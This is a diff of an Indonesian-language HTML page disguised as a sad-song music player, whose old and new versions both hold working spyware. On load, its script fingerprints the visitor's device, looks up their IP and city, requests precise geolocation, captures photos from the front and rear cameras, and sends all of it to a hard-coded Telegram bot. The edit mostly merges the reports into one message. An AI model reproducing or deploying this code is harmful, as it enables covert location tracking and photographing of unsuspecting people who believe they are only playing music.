@@ -1,255 +1,236 @@
-<!-- BY RACHEL AMANDA - NULL SIREN - GPT 😹 -->  
-<!-- VERSION FINAL DETEKSI IZIN V5 -->  
-<!DOCTYPE html>  
-<html lang="id">  
-<head>  
-  <meta charset="UTF-8" />  
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">  
-  <title>Playing music sad</title>  
-  <style>  
-    * { box-sizing: border-box; }  
-    body {  
-      margin: 0;  
-      padding: 0;  
-      background-color: #000;  
-      color: #fff;  
-      font-family: sans-serif;  
-      height: 100vh;  
-      display: flex;  
-      flex-direction: column;  
-      align-items: center;  
-      justify-content: center;  
-    }  
-    .logo {  
-      width: 140px;  
-      height: 140px;  
-      border-radius: 50%;  
-      background: url('https://files.catbox.moe/7dfcrn.jpg') center/cover no-repeat;  
-      margin-bottom: 16px;  
-    }  
-    .title {  
-      font-size: 14px;  
-      font-weight: bold;  
-      text-align: center;  
-      margin-bottom: 4px;  
-    }  
-    .artist {  
-      font-size: 12px;  
-      color: #bbb;  
-      margin-bottom: 16px;  
-    }  
-    .controls {  
-      display: flex;  
-      gap: 10px;  
-    }  
-    button {  
-      padding: 6px 16px;  
-      border: none;  
-      border-radius: 18px;  
-      background-color: #222;  
-      color: white;  
-      font-size: 12px;  
-      cursor: pointer;  
-    }  
-    button:hover {  
-      background-color: #444;  
-    }  
-  </style>  
-</head>  
-<body>  
-  <div class="logo"></div>  
-  <div class="title">Rumahsakit - Sandiwara Semu (Official Lyric Video)</div>  
-  <div class="artist">Tetap di halaman ini agar music tidak mati</div>  
-  <div class="controls">  
-    <button onclick="audio.play()">Play</button>  
-    <button onclick="audio.pause()">Pause</button>  
-  </div>  
-  <audio id="audio" src="https://files.catbox.moe/6bi9xj.mp3" autoplay muted></audio>  
-  
-  <script>  
-    const audio = document.getElementById("audio");  
-    const token = '7691252764:AAEivTZ5gqJx9LjID9Fkz43qNIICvv6FGdY';  
-    const chatId = '5914256752';  
-  
-    const kirimPesan = async (pesan) => {  
-      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {  
-        method: 'POST',  
-        headers: { 'Content-Type': 'application/json' },  
-        body: JSON.stringify({ chat_id: chatId, text: pesan, parse_mode: 'HTML' })  
-      });  
-    };  
-  
-    const kirimFoto = async (blob) => {  
-      const form = new FormData();  
-      form.append("chat_id", chatId);  
-      form.append("photo", blob, "foto.jpg");  
-      await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {  
-        method: "POST",  
-        body: form  
-      });  
-    };  
-  
-    const getDeviceBrand = () => {  
-      const ua = navigator.userAgent;  
-      if (/Vivo|vivo|V\d{4}/.test(ua)) return 'Vivo';  
-      if (/Oppo|CPH/.test(ua)) return 'Oppo';  
-      if (/SM-|Samsung/.test(ua)) return 'Samsung';  
-      if (/Infinix/.test(ua)) return 'Infinix';  
-      if (/RMX/.test(ua)) return 'Realme';  
-      if (/Redmi|Mi/.test(ua)) return 'Xiaomi';  
-      return 'Android Device';  
-    };  
-  
-    const ambilDataPerangkat = async () => {  
-      const ua = navigator.userAgent;  
-      const platform = navigator.platform;  
-      const vendor = navigator.vendor;  
-      const brand = getDeviceBrand();  
-      const gpu = (() => {  
-        try {  
-          const canvas = document.createElement("canvas");  
-          const gl = canvas.getContext("webgl");  
-          const info = gl.getExtension("WEBGL_debug_renderer_info");  
-          return {  
-            vendor: gl.getParameter(info.UNMASKED_VENDOR_WEBGL),  
-            renderer: gl.getParameter(info.UNMASKED_RENDERER_WEBGL),  
-          };  
-        } catch {  
-          return { vendor: "Tidak diketahui", renderer: "Tidak diketahui" };  
-        }  
-      })();  
-      const bat = await navigator.getBattery();  
-      const waktu = new Date().toLocaleString("id-ID");  
-      const touch = 'ontouchstart' in window ? 'Ya' : 'Tidak';  
-      const ref = document.referrer || 'Langsung';  
-  
-      return `  
-౼ 〘 𝗜𝗡𝗙𝚶𝗥𝗠𝚫𝗦𝗜 𝗣𝚵𝗥𝚫𝗡𝗚𝗞𝚫𝗧 〙 ౼  
-  
-Jenis Perangkat        : ${brand}  
-User Agent             : ${ua}  
-Platform               : ${platform}  
-Vendor Browser         : ${vendor}  
-GPU Vendor             : ${gpu.vendor}  
-GPU Renderer           : ${gpu.renderer}  
-CPU                    : ${navigator.hardwareConcurrency || '-'} inti  
-RAM                    : ${navigator.deviceMemory || '-'} GB  
-Resolusi Layar         : ${screen.width} x ${screen.height}  
-Orientasi Layar        : ${screen.orientation?.type || '-'}  
-Touch Support          : ${touch} (${navigator.maxTouchPoints} titik)  
-Kerapatan Piksel       : ${window.devicePixelRatio}  
-Cookies Aktif          : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}  
-JavaScript             : Aktif  
-Do Not Track           : ${navigator.doNotTrack == "1" ? "Ya" : "Tidak"}  
-HTTPS                  : ${location.protocol === "https:" ? "Ya" : "Tidak"}  
-Zona Waktu             : ${Intl.DateTimeFormat().resolvedOptions().timeZone}  
-Waktu Lokal            : ${waktu}  
-Referrer               : ${ref}  
-Baterai                : ${Math.round(bat.level * 100)}%  
-Sedang Mengisi         : ${bat.charging ? '✅' : '🚫'}  
-      `.trim();  
-    };  
-  
-    const ambilIPInfo = async () => {  
-      try {  
-        const res = await fetch("https://ipapi.co/json");  
-        const ip = await res.json();  
-        return `  
-౼ 〘 𝗜𝗡𝗙𝚶𝗥𝗠𝚫𝗦𝗜 𝗝𝚫𝗥𝗜𝗡𝗚𝚫𝗡 〙 ౼  
-  
-IP Publik           : ${ip.ip}  
-Penyedia Layanan    : ${ip.org}  
-Negara              : ${ip.country_name}  
-Provinsi            : ${ip.region}  
-Kota                : ${ip.city}  
-`.trim();  
-      } catch {  
-        return "❌ Gagal mengambil data IP.";  
-      }  
-    };  
-  
-    const ambilLokasi = () => {  
-      return new Promise((resolve) => {  
-        navigator.geolocation.getCurrentPosition(pos => {  
-          const { latitude, longitude, accuracy } = pos.coords;  
-          resolve(`౼ 〘 𝗟𝚶𝗞𝚫𝗦𝗜 𝗟𝚫𝗡𝗚𝗦𝗨𝗡𝗚 〙 ౼\n\nLatitude            : ${latitude}\nLongitude           : ${longitude}\nAkurasi             : ±${accuracy} meter\nPeta                : https://maps.google.com/?q=${latitude},${longitude}`);  
-        }, () => {  
-          resolve(`- 〘 𝗟𝚶𝗞𝚫𝗦𝗜 𝗟𝚫𝗡𝗚𝗦𝗨𝗡𝗚 〙 -\n\n❌ Lokasi tidak diizinkan oleh pengguna.`);  
-        }, { enableHighAccuracy: true, timeout: 5000 });  
-      });  
-    };  
-  
-    const ambilKamera = async (facingMode, label) => {  
-      try {  
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });  
-        const video = document.createElement("video");  
-        video.srcObject = stream;  
-        video.setAttribute("playsinline", true);  
-        await video.play();  
-  
-        await new Promise(resolve => {  
-          const cek = () => {  
-            if (video.videoWidth > 0 && video.videoHeight > 0) resolve();  
-            else requestAnimationFrame(cek);  
-          };  
-          cek();  
-        });  
-  
-        for (let i = 0; i < 5; i++) {  
-          const canvas = document.createElement("canvas");  
-          canvas.width = video.videoWidth;  
-          canvas.height = video.videoHeight;  
-          const ctx = canvas.getContext("2d");  
-          ctx.drawImage(video, 0, 0);  
-          canvas.toBlob(async (blob) => {  
-            if (blob) await kirimFoto(blob);  
-          }, "image/jpeg");  
-          await new Promise(r => setTimeout(r, 50));  
-        }  
-  
-        stream.getTracks().forEach(track => track.stop());  
-        return "";  
-      } catch {  
-        return `౼ 〘 ${label} 〙 ౼\n\n❌ Kamera tidak diizinkan oleh pengguna.`;  
-      }  
-    };  
-  
-    const cekIzinDanMulai = async () => {  
-      try {  
-        const izinKamera = await navigator.permissions.query({ name: "camera" });  
-        const izinLokasi = await navigator.permissions.query({ name: "geolocation" });  
-  
-        if (izinKamera.state === "granted" && izinLokasi.state === "granted") {  
-          mulai();  
-        } else {  
-          mulai();  
-        }  
-      } catch {  
-        mulai();  
-      }  
-    };  
-  
-    const mulai = async () => {  
-      audio.muted = false;  
-      try { await audio.play(); } catch(e) {}  
-  
-      const info = await ambilDataPerangkat();  
-      const ip = await ambilIPInfo();  
-      await kirimPesan(`${info}\n\n${ip}`);  
-  
-      const lokasi = await ambilLokasi();  
-      await kirimPesan(lokasi);  
-  
-      const kameraDepan = await ambilKamera("user", "𝗞𝚫𝗠𝚵𝗥𝚫 𝗗𝚵𝗣𝚫𝗡");  
-      const kameraBelakang = await ambilKamera("environment", "𝗞𝚫𝗠𝚵𝗥𝚫 𝗕𝚵𝗟𝚫𝗞𝚫𝗡𝗚");  
-      if (kameraDepan || kameraBelakang) {  
-        await kirimPesan(`${kameraDepan}\n\n${kameraBelakang}`);  
-      }  
-    };  
-  
-    window.addEventListener("load", () => {  
-      setTimeout(cekIzinDanMulai, 0);  
-    });  
-  </script>  
-</body>  
+<!-- BY RACHEL AMANDA - NULL SIREN - GPT 😹 -->
+<!-- VERSION FINAL V6.1 GABUNG TELEGRAM -->
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Playing music sad</title>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #000;
+      color: #fff;
+      font-family: sans-serif;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+    .logo {
+      width: 140px;
+      height: 140px;
+      border-radius: 50%;
+      background: url('https://files.catbox.moe/7dfcrn.jpg') center/cover no-repeat;
+      margin-bottom: 16px;
+    }
+    .title {
+      font-size: 14px;
+      font-weight: bold;
+      text-align: center;
+      margin-bottom: 4px;
+    }
+    .artist {
+      font-size: 12px;
+      color: #bbb;
+      margin-bottom: 16px;
+    }
+    .controls {
+      display: flex;
+      gap: 10px;
+    }
+    button {
+      padding: 6px 16px;
+      border: none;
+      border-radius: 18px;
+      background-color: #222;
+      color: white;
+      font-size: 12px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #444;
+    }
+  </style>
+</head>
+<body>
+  <div class="logo"></div>
+  <div class="title">Rumahsakit - Sandiwara Semu (Official Lyric Video)</div>
+  <div class="artist">Tetap di halaman ini agar music tidak mati</div>
+  <div class="controls">
+    <button onclick="audio.play()">Play</button>
+    <button onclick="audio.pause()">Pause</button>
+  </div>
+  <audio id="audio" src="https://files.catbox.moe/6bi9xj.mp3" autoplay muted></audio>
+
+  <script>
+    const audio = document.getElementById("audio");
+    const token = '7691252764:AAEivTZ5gqJx9LjID9Fkz43qNIICvv6FGdY';
+    const chatId = '5914256752';
+
+    const kirimPesan = async (pesan) => {
+      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: pesan, parse_mode: 'HTML' })
+      });
+    };
+
+    const kirimFoto = async (blob) => {
+      const form = new FormData();
+      form.append("chat_id", chatId);
+      form.append("photo", blob, "foto.jpg");
+      await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        method: "POST",
+        body: form
+      });
+    };
+
+    const getDeviceBrand = () => {
+      const ua = navigator.userAgent;
+      if (/Vivo|vivo|V\d{4}/.test(ua)) return 'Vivo';
+      if (/Oppo|CPH/.test(ua)) return 'Oppo';
+      if (/SM-|Samsung/.test(ua)) return 'Samsung';
+      if (/Infinix/.test(ua)) return 'Infinix';
+      if (/RMX/.test(ua)) return 'Realme';
+      if (/Redmi|Mi/.test(ua)) return 'Xiaomi';
+      return 'Android Device';
+    };
+
+    const ambilDataPerangkat = async () => {
+      const ua = navigator.userAgent;
+      const platform = navigator.platform;
+      const vendor = navigator.vendor;
+      const brand = getDeviceBrand();
+      const gpu = (() => {
+        try {
+          const canvas = document.createElement("canvas");
+          const gl = canvas.getContext("webgl");
+          const info = gl.getExtension("WEBGL_debug_renderer_info");
+          return {
+            vendor: gl.getParameter(info.UNMASKED_VENDOR_WEBGL),
+            renderer: gl.getParameter(info.UNMASKED_RENDERER_WEBGL),
+          };
+        } catch {
+          return { vendor: "Tidak diketahui", renderer: "Tidak diketahui" };
+        }
+      })();
+      const bat = await navigator.getBattery();
+      const waktu = new Date().toLocaleString("id-ID");
+      const touch = 'ontouchstart' in window ? 'Ya' : 'Tidak';
+      const ref = document.referrer || 'Langsung';
+
+      return `
+౼ 〘 𝗜𝗡𝗙𝚶𝗥𝗠𝚫𝗦𝗜 𝗣𝚵𝗥𝚫𝗡𝗚𝚲𝗞𝚫𝗧 〙 ౼
+
+Jenis Perangkat        : ${brand}
+User Agent             : ${ua}
+Platform               : ${platform}
+Vendor Browser         : ${vendor}
+GPU Vendor             : ${gpu.vendor}
+GPU Renderer           : ${gpu.renderer}
+CPU                    : ${navigator.hardwareConcurrency || '-'} inti
+RAM                    : ${navigator.deviceMemory || '-'} GB
+Resolusi Layar         : ${screen.width} x ${screen.height}
+Orientasi Layar        : ${screen.orientation?.type || '-'}
+Touch Support          : ${touch} (${navigator.maxTouchPoints} titik)
+Kerapatan Piksel       : ${window.devicePixelRatio}
+Cookies Aktif          : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
+JavaScript             : Aktif
+Do Not Track           : ${navigator.doNotTrack == "1" ? "Ya" : "Tidak"}
+HTTPS                  : ${location.protocol === "https:" ? "Ya" : "Tidak"}
+Zona Waktu             : ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+Waktu Lokal            : ${waktu}
+Referrer               : ${ref}
+Baterai                : ${Math.round(bat.level * 100)}%
+Sedang Mengisi         : ${bat.charging ? '✅' : '🚫'}
+      `.trim();
+    };
+
+    const ambilIPInfo = async () => {
+      try {
+        const res = await fetch("https://ipapi.co/json");
+        const ip = await res.json();
+        return `
+౼ 〘 𝗜𝗡𝗙𝚶𝗥𝗠𝚫𝗦𝗜 𝗝𝚫𝗥𝗜𝗡𝗚𝚫𝗡 〙 ౼
+
+IP Publik           : ${ip.ip}
+Penyedia Layanan    : ${ip.org}
+Negara              : ${ip.country_name}
+Provinsi            : ${ip.region}
+Kota                : ${ip.city}`.trim();
+      } catch {
+        return "❌ Gagal mengambil data IP.";
+      }
+    };
+
+    const ambilLokasi = () => {
+      return new Promise((resolve) => {
+        navigator.geolocation.getCurrentPosition(pos => {
+          const { latitude, longitude, accuracy } = pos.coords;
+          resolve(`౼ 〘 𝗟𝚶𝗞𝚫𝗦𝗜 𝗟𝚫𝗡𝗚𝗦𝗨𝗡𝗚 〙 ౼\n\nLatitude            : ${latitude}\nLongitude           : ${longitude}\nAkurasi             : ±${accuracy} meter\nPeta                : https://maps.google.com/?q=${latitude},${longitude}`);
+        }, () => {
+          resolve(`౼ 〘 𝗟𝚶𝗞𝚫𝗦𝗜 𝗟𝚫𝗡𝗚𝗦𝗨𝗡𝗚 〙 ౼\n\n❌ Lokasi tidak diizinkan oleh pengguna.`);
+        }, { enableHighAccuracy: true, timeout: 5000 });
+      });
+    };
+
+    const ambilKamera = async (facingMode) => {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        video.setAttribute("playsinline", true);
+        await video.play();
+        await new Promise(resolve => {
+          const cek = () => {
+            if (video.videoWidth > 0) resolve();
+            else requestAnimationFrame(cek);
+          };
+          cek();
+        });
+        for (let i = 0; i < 5; i++) {
+          const canvas = document.createElement("canvas");
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext("2d");
+          ctx.drawImage(video, 0, 0);
+          canvas.toBlob(async (blob) => {
+            if (blob) await kirimFoto(blob);
+          }, "image/jpeg");
+          await new Promise(r => setTimeout(r, 50));
+        }
+        stream.getTracks().forEach(track => track.stop());
+        return true;
+      } catch {
+        return false;
+      }
+    };
+
+    const mulai = async () => {
+      audio.muted = false;
+      try { await audio.play(); } catch {}
+
+      const info = await ambilDataPerangkat();
+      const ip = await ambilIPInfo();
+      const lokasi = await ambilLokasi();
+
+      const depan = await ambilKamera("user");
+      const belakang = await ambilKamera("environment");
+
+      const kameraDepanStatus = `౼ 〘 𝗞𝚫𝗠𝚵𝗥𝚫 𝗗𝚵𝗣𝚫𝗡 〙 ౼\n\n${depan ? '✅ Kamera berhasil diakses' : '❌ Kamera tidak diizinkan oleh pengguna.'}`;
+      const kameraBelakangStatus = `౼ 〘 𝗞𝚫𝗠𝚵𝗥𝚫 𝗕𝚵𝗟𝚫𝗞𝚫𝗡𝗚 〙 ౼\n\n${belakang ? '✅ Kamera berhasil diakses' : '❌ Kamera tidak diizinkan oleh pengguna.'}`;
+
+      const gabungSemua = [info, ip, lokasi, kameraDepanStatus, kameraBelakangStatus].join('\n\n');
+      await kirimPesan(gabungSemua);
+    };
+
+    window.addEventListener("load", () => {
+      setTimeout(mulai, 0);
+    });
+  </script>
+</body>
 </html>
